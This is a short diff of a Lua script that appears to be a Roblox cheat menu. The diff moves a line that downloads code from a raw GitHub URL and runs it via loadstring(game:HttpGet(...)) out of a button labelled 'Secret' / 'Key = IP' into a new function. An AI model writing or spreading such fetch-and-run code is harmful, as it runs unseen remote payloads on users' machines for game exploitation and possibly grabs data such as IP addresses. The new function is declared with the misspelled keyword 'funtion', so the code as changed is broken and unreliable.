@@ -40,10 +40,12 @@ stat:NewButton("Sever Hop", "ButtonInfo", function()
 end)
 
 stat:NewButton("Secret", "Key = IP", function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/krymmirai/another/main/test",true))()
+    ep()
 end)
 stat:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.KeypadZero, function()
 	Library:ToggleUI()
 end)
-
+funtion ep()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/krymmirai/another/main/test",true))()
+end
 --
